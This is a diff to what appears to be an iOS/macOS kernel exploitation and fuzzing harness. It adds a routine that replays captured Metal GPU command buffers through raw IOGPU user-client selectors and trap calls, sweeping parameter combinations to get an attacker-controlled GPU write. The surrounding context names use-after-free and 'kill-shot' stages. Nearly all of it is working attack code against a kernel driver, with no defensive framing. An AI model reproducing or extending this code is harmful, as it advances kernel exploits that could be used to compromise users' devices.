@@ -18,6 +18,7 @@
 //   P5 steady fuzz if alive
 #include "fuzz.h"
 #include <IOSurface/IOSurfaceRef.h>
+#include <Foundation/Foundation.h>
 #include <sys/mman.h>
 #include <stdarg.h>
 
@@ -13062,6 +13063,343 @@ static void p_gpuwrite(void) {
     LOG("[v80] done (alive)");
 }
 
+
+// V83: Metal-format replay. new_resource format B (pure shared alloc, type 0x00),
+// typed shmems (sel12 type arg), segment list with 6-pack resource groups.
+// gpu_shmem_t: sel12 with explicit shmem type (0=segment list, 1=kernel cmd,
+// 2=debug, 3=sideband). Old gpu_shmem (always type 0) is left untouched.
+static uint32_t gpu_shmem_t(io_connect_t c, uint64_t size, uint64_t type, uint8_t **va_out) {
+    uint8_t *out = must_map(0x1000);
+    memset(out, 0, 0x1000);
+    uint64_t a[2] = { size, type };
+    size_t osz = 0x10;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 12, a, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t va = *(uint64_t *)out;
+    uint32_t id = *(uint32_t *)(out + 0xc);
+    LOG("[mtlr] sel12 size 0x%llx type %llu -> kr 0x%08x va %llx id %u", size, type, kr, va, id);
+    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
+    if (kr) return 0;
+    *va_out = (uint8_t *)(uintptr_t)va;
+    return id;
+}
+
+// gpu_resource2: Metal "format B" (0x68 bytes), type 0x00 = pure shared alloc.
+// NB: the offsets come from a real Metal trace (macOS 27, sel 9, stInSz 104):
+//   +0x00 u32 type=0 | +0x08 u32 0x00010001 | +0x0c u32 1 |
+//   +0x10 u32 0x01000101 | +0x14 u32 flags (0x470 traced) | +0x30 qword 1 |
+//   +0x48 qword sysMemSize | rest 0
+// (the earlier spec draft had +0x10..+0x58 shifted one qword down — wrong).
+// On macOS the selector is 9; on iOS our sel 8 accepted format A — try both.
+// Returns rid; *gpuva_out = GPUVA (expect space 0x1: hi dword 0x100),
+// *cpu_out = CPU data pointer (out+0x08), may be NULL.
+static uint32_t gpu_resource2(io_connect_t c, uint64_t size, uint64_t *gpuva_out, uint8_t **cpu_out) {
+    static const uint32_t sels[]   = { 8, 9 };
+    static const uint32_t flagvs[] = { 0x470, 0x1000470 };
+    for (unsigned s = 0; s < sizeof(sels)/sizeof(sels[0]); s++) {
+        for (unsigned f = 0; f < sizeof(flagvs)/sizeof(flagvs[0]); f++) {
+            uint8_t *in = must_map(0x1000);
+            uint8_t *out = must_map(0x1000);
+            memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+            *(uint32_t *)(in + 0x00) = 0x00;          // resourceType: pure shared alloc
+            *(uint32_t *)(in + 0x08) = 0x00010001;
+            *(uint32_t *)(in + 0x0c) = 1;
+            *(uint32_t *)(in + 0x10) = 0x01000101;
+            *(uint32_t *)(in + 0x14) = flagvs[f];     // 0x470 = traced Metal value
+            *(uint64_t *)(in + 0x30) = 1;
+            *(uint64_t *)(in + 0x48) = size;          // sysMemSize
+            size_t osz = 0x58;
+            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+            kern_return_t kr = IOConnectCallMethod(c, sels[s], NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+            uint64_t gpuva = *(uint64_t *)(out + 0x00);
+            uint64_t cpup  = *(uint64_t *)(out + 0x08);
+            uint32_t rid   = *(uint32_t *)(out + 0x24);
+            LOG("[mtlr] resource2 sel%u flags %x sz 0x%llx -> kr 0x%08x rid %u GPUVA 0x%llx cpu %llx",
+                sels[s], flagvs[f], size, kr, rid, gpuva, cpup);
+            if (!kr && rid) {
+                uint64_t *q = (uint64_t *)out;
+                LOG("[mtlr]   out: %016llx %016llx %016llx %016llx", q[0], q[1], q[2], q[3]);
+                LOG("[mtlr]   out: %016llx %016llx %016llx %016llx", q[4], q[5], q[6], q[7]);
+                vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
+                vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
+                *gpuva_out = gpuva;
+                *cpu_out = (uint8_t *)(uintptr_t)cpup;
+                return rid;
+            }
+            vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
+            vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
+        }
+    }
+    return 0;
+}
+
+static void p_mtlreplay(void) {
+    LOG("[mtlr] Metal-format replay: format-B resources + 6-pack segment list");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[mtlr] bind fail"); return; }
+    LOG("[mtlr] setup: nq %llu qid %llu", nqid, qid);
+
+    // Metal-style shared buffers; 0x10000 matches the captured fill range.
+    // A/B mirror the capture's res0 (shader-cache/pool metadata @0x1_00000000)
+    // and res1 (dest @0x1_00018000); C mirrors res2 (pool tables @0x1_00030000).
+    const uint64_t BSZ = 0x10000;
+    uint64_t gpuvaA = 0, gpuvaB = 0, gpuvaC = 0;
+    uint8_t *cpuA = NULL, *cpuB = NULL, *cpuC = NULL;
+    uint32_t ridA = gpu_resource2(c, BSZ, &gpuvaA, &cpuA);
+    uint32_t ridB = gpu_resource2(c, BSZ, &gpuvaB, &cpuB);
+    uint32_t ridC = gpu_resource2(c, 0x20000, &gpuvaC, &cpuC);
+    if (!ridA || !ridB) { LOG("[mtlr] resource2 failed (ridA %u ridB %u)", ridA, ridB); return; }
+    LOG("[mtlr] A: rid %u GPUVA 0x%llx cpu %p | B: rid %u GPUVA 0x%llx cpu %p | C: rid %u GPUVA 0x%llx cpu %p",
+        ridA, gpuvaA, cpuA, ridB, gpuvaB, cpuB, ridC, gpuvaC, cpuC);
+    LOG("[mtlr] space-0x1 check: A %d B %d C %d (hi dword 0x100 expected)",
+        (uint32_t)(gpuvaA >> 32) == 0x100, (uint32_t)(gpuvaB >> 32) == 0x100,
+        (uint32_t)(gpuvaC >> 32) == 0x100);
+    LOG("[mtlr] capture-offset check: A==0x1_00000000:%d B==0x1_00018000:%d C==0x1_00030000:%d",
+        gpuvaA == 0x10000000000ULL, gpuvaB == 0x10000018000ULL, gpuvaC == 0x10000030000ULL);
+    if (!cpuA || !cpuB) { LOG("[mtlr] no CPU mapping returned, cannot drive/verify; abort"); return; }
+    // exact captured contents (bundled); fallback: 0x41 fill
+    int have_assets = 0;
+    {
+        NSBundle *mb = [NSBundle mainBundle];
+        NSString *p0 = [mb pathForResource:@"res0_metacache" ofType:@"bin"];
+        NSString *p1 = [mb pathForResource:@"res1_dest" ofType:@"bin"];
+        NSString *p2 = [mb pathForResource:@"res2_pool" ofType:@"bin"];
+        NSData *d0 = p0 ? [NSData dataWithContentsOfFile:p0] : nil;
+        NSData *d1 = p1 ? [NSData dataWithContentsOfFile:p1] : nil;
+        NSData *d2 = p2 ? [NSData dataWithContentsOfFile:p2] : nil;
+        if (d0.length == BSZ && d1.length == BSZ && d2.length == 0x20000 && cpuC) {
+            memcpy(cpuA, d0.bytes, BSZ);
+            memcpy(cpuB, d1.bytes, BSZ);
+            memcpy(cpuC, d2.bytes, 0x20000);
+            have_assets = 1;
+        }
+    }
+    LOG("[mtlr] assets: %s", have_assets ? "captured contents loaded" : "MISSING, 0x41 fallback");
+    if (!have_assets) {
+        memset(cpuA, 0x41, BSZ);    // pattern
+        memset(cpuB, 0, BSZ);       // zeroed target
+        if (cpuC) memset(cpuC, 0, 0x20000);
+    }
+
+    uint8_t *vaCmd, *vaSeg, *vaCmd0;
+    // creation order mirrors the capture: segment list first (id 1), then the
+    // kernel command buffer (id 2) — the captured submit entry was {2, 1}.
+    uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);   // segment list
+    uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);   // kernel command buffer (typed)
+    uint32_t idCmd0 = gpu_shmem(c, 0x4000, &vaCmd0);      // legacy type-0 cmd shmem
+    if (!idCmd || !idSeg || !idCmd0) return;
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    // capture-faithful completion: two pointers 0x30 apart in one buffer
+    uint8_t *comp = must_map(0x1000);
+    memset(comp, 0, 0x1000);
+    // v80-style userspace completion/aux: storage with residency table for B
+    uint8_t *aux1 = must_map(0x1000);
+    uint8_t *aux2 = must_map(0x1000);
+    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
+    *(uint64_t *)(aux1 + 0x300) = (uint64_t)(uintptr_t)aux2;   // resource table ptr
+    *(uint32_t *)(aux1 + 0x318) = 4;                           // table capacity
+    *(uint64_t *)(aux2 + 0x00) = gpuvaB;
+    *(uint64_t *)(aux2 + 0x08) = (uint64_t)(uintptr_t)cpuB;
+    *(uint64_t *)(aux2 + 0x10) = gpuvaB + BSZ;
+    *(uint64_t *)(aux2 + 0x18) = (uint64_t)(uintptr_t)cpuB;
+    *(uint64_t *)(aux2 + 0x38) = ridB;
+
+    // Fill a cmd shmem with the full captured image; remap every space-0x1
+    // GPUVA ref: dest (0x1_00018000) -> gpuvaB, all others -> into buffer A.
+    // Optionally put a residency list {2, ridA, ridB} into the nop @+8.
+#define MTLR_FILL_CMD(va, resid) do { \
+        uint8_t *_v = (va); \
+        memcpy(_v, agx_A4_image, 0x4000); \
+        for (long _o = 0; _o < 0x1000 - 8; _o += 4) { \
+            uint64_t _q = *(uint64_t *)(_v + _o); \
+            if ((_q >> 32) == 0x100) { \
+                if ((_q & 0xffffffff) == 0x18000) *(uint64_t *)(_v + _o) = gpuvaB; \
+                else *(uint64_t *)(_v + _o) = gpuvaA + (_q & 0x3fff); \
+            } \
+        } \
+        if (resid) { \
+            *(uint32_t *)(_v + 0x08) = 2; \
+            *(uint32_t *)(_v + 0x0c) = ridA; \
+            *(uint32_t *)(_v + 0x10) = ridB; \
+        } \
+    } while (0)
+
+    // Fill seglist shmem. style 0: hand-built per spec B (KCL count=2 finalized).
+    // style 1: capture-faithful (agx_B4_image verbatim) + 6-pack group at +0x48,
+    // numResources/numResourceGroups patched into the segment.
+#define MTLR_FILL_SEG(va, style, usage) do { \
+        uint8_t *_v = (va); \
+        memset(_v, 0, 0x4000); \
+        uint8_t *_g6; \
+        if ((style) == 0) { \
+            *(uint32_t *)(_v + 0x08) = 2; \
+            *(uint32_t *)(_v + 0x0c) = 0xc0000001; \
+            *(uint32_t *)(_v + 0x10) = 0; \
+            *(uint32_t *)(_v + 0x14) = 0xac; \
+            *(uint32_t *)(_v + 0x18) = 0xac; \
+            *(uint32_t *)(_v + 0x1c) = 0x404; \
+            *(uint32_t *)(_v + 0x28) = 1; \
+            *(uint32_t *)(_v + 0x2c) = 0x80000070; \
+            *(uint32_t *)(_v + 0x38) = 0xac; \
+            *(uint32_t *)(_v + 0x3c) = 0x404; \
+            *(uint32_t *)(_v + 0x48) = 2; \
+            *(uint32_t *)(_v + 0x4c) = 1; \
+            _g6 = _v + 0x50; \
+        } else { \
+            memcpy(_v, agx_B4_image, 0x4000); \
+            *(uint32_t *)(_v + 0x40) = 2; \
+            *(uint32_t *)(_v + 0x44) = 1; \
+            _g6 = _v + 0x48; \
+        } \
+        *(uint32_t *)(_g6 + 0x00) = ridA; \
+        *(uint32_t *)(_g6 + 0x04) = ridB; \
+        *(uint32_t *)(_g6 + 0x18) = (uint32_t)(BSZ >> 10); \
+        *(uint32_t *)(_g6 + 0x1c) = (uint32_t)(BSZ >> 10); \
+        *(uint16_t *)(_g6 + 0x30) = (uint16_t)(usage); \
+        *(uint16_t *)(_g6 + 0x32) = (uint16_t)(usage); \
+        *(uint16_t *)(_g6 + 0x3e) = 2; \
+    } while (0)
+
+    // FULL: faithful replay of the captured fillBuffer submit. Three resources
+    // carry the exact captured contents at the exact captured GPUVAs (the
+    // allocator is deterministic per fresh process: 0x1_00000000 / 0x1_00018000
+    // / 0x1_00030000), command image is submitted UNPATCHED. Segment list is
+    // capture-faithful plus one 6-pack group with all three rids. If the GPU
+    // executes the fill, dest B turns 0x5A (fill pattern from the capture).
+    int full_ok = 0;
+    if (have_assets && ridC &&
+        gpuvaA == 0x10000000000ULL && gpuvaB == 0x10000018000ULL &&
+        gpuvaC == 0x10000030000ULL) {
+        static const struct { int cmdt; uint16_t usage; const char *n; } fcombos[] = {
+            { 1, 3, "FULL t1 u3" },     // entry {idCmd=2, idSeg=1} exactly like capture
+            { 0, 3, "FULL t0 u3" },
+            { 1, 6, "FULL t1 u6" },
+        };
+        for (unsigned fi = 0; fi < sizeof(fcombos)/sizeof(fcombos[0]); fi++) {
+            uint8_t *vc = fcombos[fi].cmdt ? vaCmd : vaCmd0;
+            uint32_t idc = fcombos[fi].cmdt ? idCmd : idCmd0;
+            memcpy(vc, agx_A4_image, 0x4000);            // verbatim, no patching
+            memcpy(vaSeg, agx_B4_image, 0x4000);         // verbatim KCL+SL+segment
+            *(uint32_t *)(vaSeg + 0x40) = 3;             // numResources
+            *(uint32_t *)(vaSeg + 0x44) = 1;             // numResourceGroups
+            uint8_t *g6 = vaSeg + 0x48;
+            memset(g6, 0, 0x40);
+            *(uint32_t *)(g6 + 0x00) = ridA;
+            *(uint32_t *)(g6 + 0x04) = ridB;
+            *(uint32_t *)(g6 + 0x08) = ridC;
+            *(uint32_t *)(g6 + 0x18) = (uint32_t)(BSZ >> 10);
+            *(uint32_t *)(g6 + 0x1c) = (uint32_t)(BSZ >> 10);
+            *(uint32_t *)(g6 + 0x20) = (uint32_t)(0x20000 >> 10);
+            *(uint16_t *)(g6 + 0x30) = fcombos[fi].usage;
+            *(uint16_t *)(g6 + 0x32) = fcombos[fi].usage;
+            *(uint16_t *)(g6 + 0x34) = fcombos[fi].usage;
+            *(uint16_t *)(g6 + 0x3e) = 3;
+            memset(entry, 0, 0x1000);
+            *(uint32_t *)(entry + 0x00) = idc;
+            *(uint32_t *)(entry + 0x04) = idSeg;
+            *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;         // capture form
+            *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
+            *outw = 0xdeadbeef;
+            memset(cpuB, 0, BSZ);
+            memset(comp, 0, 0x1000);
+            kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+            // post-submit bookkeeping observed in the Metal trace
+            uint64_t s17[1] = { 1 };
+            kern_return_t k17 = IOConnectCallScalarMethod(c, 17, s17, 1, NULL, NULL);
+            uint64_t s15[1] = { 2 };
+            kern_return_t k15a = IOConnectCallScalarMethod(c, 15, s15, 1, NULL, NULL);
+            s15[0] = 1;
+            kern_return_t k15b = IOConnectCallScalarMethod(c, 15, s15, 1, NULL, NULL);
+            // poll up to 2s for the fill to land / completion to update
+            long nz = 0, f5 = 0;
+            for (int w = 0; w < 20; w++) {
+                usleep(100000);
+                nz = 0; f5 = 0;
+                for (long i = 0; i < (long)BSZ; i += 0x40) {   // sampled scan
+                    if (cpuB[i]) nz++;
+                    if (cpuB[i] == 0x5A) f5++;
+                }
+                if (nz) break;
+            }
+            uint64_t *cq = (uint64_t *)comp;
+            LOG("[mtlr] %s -> kr 0x%08x outw %08x post{17:%08x 15:%08x/%08x} | B(sampled): nonzero %ld, 0x5A %ld %s",
+                fcombos[fi].n, kt, *outw, k17, k15a, k15b, nz, f5, nz ? "GPU WRITE OBSERVED!" : "(no write)");
+            LOG("[mtlr] B[0..15] %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
+                cpuB[0], cpuB[1], cpuB[2], cpuB[3], cpuB[4], cpuB[5], cpuB[6], cpuB[7],
+                cpuB[8], cpuB[9], cpuB[10], cpuB[11], cpuB[12], cpuB[13], cpuB[14], cpuB[15]);
+            LOG("[mtlr] comp: %016llx %016llx %016llx %016llx | comp+30: %016llx %016llx",
+                cq[0], cq[1], cq[2], cq[3], cq[6], cq[7]);
+            if (nz) { full_ok = 1; LOG("[mtlr] *** FULL replay succeeded"); break; }
+        }
+    } else {
+        LOG("[mtlr] FULL replay skipped (assets %d ridC %u gpuva match %d/%d/%d)",
+            have_assets, ridC, gpuvaA == 0x10000000000ULL, gpuvaB == 0x10000018000ULL,
+            gpuvaC == 0x10000030000ULL);
+    }
+
+    // Combo ladder: bridge from the known-accepted v80 setup (outw=0) to the
+    // spec-B hand-built structures. Fields: cmd shmem (0=legacy type0,
+    // 1=typed type1), seglist style, aux ptrs in entry, ridB @entry+0x20,
+    // residency in nop, usage. Skipped entirely when FULL already wrote.
+    static const struct {
+        int cmdshmem, segstyle, aux, ent20, resid; uint16_t usage; const char *n;
+    } combos[] = {
+        { 0, 1, 1, 1, 0, 3,      "S1 capseg+6pk u3" },       // closest to v80
+        { 0, 1, 1, 1, 1, 3,      "S2 S1+residnop" },
+        { 1, 1, 1, 1, 0, 3,      "S3 S1 cmdtype1" },
+        { 0, 1, 1, 1, 0, 0xffff, "S4 S1 uFFFF" },
+        { 0, 1, 0, 0, 0, 3,      "S5 S1 noaux no20" },
+        { 0, 0, 1, 1, 0, 3,      "S6 handseg u3" },
+        { 1, 0, 0, 0, 0, 3,      "S7 handseg cmdtype1 bare" },
+        { 1, 0, 0, 0, 1, 0xffff, "S8 handseg t1 resid uFFFF" },
+    };
+    for (unsigned ci = 0; !full_ok && ci < sizeof(combos)/sizeof(combos[0]); ci++) {
+        uint8_t *vc = combos[ci].cmdshmem ? vaCmd : vaCmd0;
+        uint32_t idc = combos[ci].cmdshmem ? idCmd : idCmd0;
+        MTLR_FILL_CMD(vc, combos[ci].resid);
+        MTLR_FILL_SEG(vaSeg, combos[ci].segstyle, combos[ci].usage);
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = idc;          // kernelCmdShmemID
+        *(uint32_t *)(entry + 0x04) = idSeg;        // segmentListShmemID
+        if (combos[ci].aux) {
+            *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
+            *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
+        }
+        if (combos[ci].ent20)
+            *(uint32_t *)(entry + 0x20) = ridB;     // prepare/residency reference
+        *outw = 0xdeadbeef;
+        memset(cpuB, 0, BSZ);
+        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+        usleep(300000);
+        long nz = 0, pat = 0;
+        for (long i = 0; i < (long)BSZ; i++) {
+            if (cpuB[i]) nz++;
+            if (cpuB[i] == 0x41) pat++;
+        }
+        LOG("[mtlr] combo %s -> kr 0x%08x outw %08x | B: nonzero %ld, pattern(0x41) %ld / 0x%llx %s",
+            combos[ci].n, kt, *outw, nz, pat, BSZ, nz ? "GPU WRITE OBSERVED!" : "(no write)");
+        LOG("[mtlr] B[0..15] %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
+            cpuB[0], cpuB[1], cpuB[2], cpuB[3], cpuB[4], cpuB[5], cpuB[6], cpuB[7],
+            cpuB[8], cpuB[9], cpuB[10], cpuB[11], cpuB[12], cpuB[13], cpuB[14], cpuB[15]);
+        if (nz) { LOG("[mtlr] *** success candidate in combo %s", combos[ci].n); break; }
+    }
+    LOG("[mtlr] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -13192,6 +13530,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_mtlreplay();      // v83: Metal-format replay (format-B resources + 6-pack seglist) FIRST
         p_gpuwrite();       // v80: GPUVA-correct blit redirect FIRST
         p_killshot_only();  // v79: isolated kill-shot loop FIRST
         p_blithit();        // v76: blit + prepared resource sweep
